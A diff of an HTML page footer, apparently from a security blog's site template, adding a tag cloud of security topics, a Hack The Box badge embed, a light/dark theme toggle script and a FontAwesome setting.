+  <div class="tag-cloud"><a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-1">exploit development</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
       </div>
-    </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper"><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
 
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script></div>
   </div>
-
 </footer>
-</body>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
 
 </html>
-
